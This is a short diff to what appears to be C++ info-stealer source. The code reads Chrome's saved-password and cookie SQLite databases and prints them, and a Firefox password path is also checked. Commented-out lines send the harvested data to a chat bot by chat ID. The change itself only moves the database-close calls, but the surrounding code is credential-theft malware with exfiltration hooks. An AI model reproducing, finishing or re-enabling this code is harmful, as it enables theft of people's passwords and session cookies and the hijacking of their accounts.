@@ -54,7 +54,6 @@ int main()
             {
                 cout<<"DB Error: "<<sqlite3_errmsg(db)<<endl;
                 //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
-                sqlite3_close(db);
             }
             else
             {
@@ -62,6 +61,7 @@ int main()
                 //bot_sender.send(ChatID, pass.str());
                 cout<<pass.str();
             }
+            sqlite3_close(db);
         }
 
         if(experimental::filesystem::exists(chrome_cookies_path))
@@ -76,7 +76,6 @@ int main()
             {
                 cout<<"DB Error: "<<sqlite3_errmsg(db)<<endl;
                 //bot_sender.send(ChatID, "DB Error: " + sqlite3_errmsg(db));
-                sqlite3_close(db);
             }
             else
             {
@@ -84,6 +83,7 @@ int main()
                 //bot_sender.send(ChatID, cookies.str());
                 cout<<cookies.str();
             }
+            sqlite3_close(db);
         }
 
         if(experimental::filesystem::exists(firefox_pass_path))
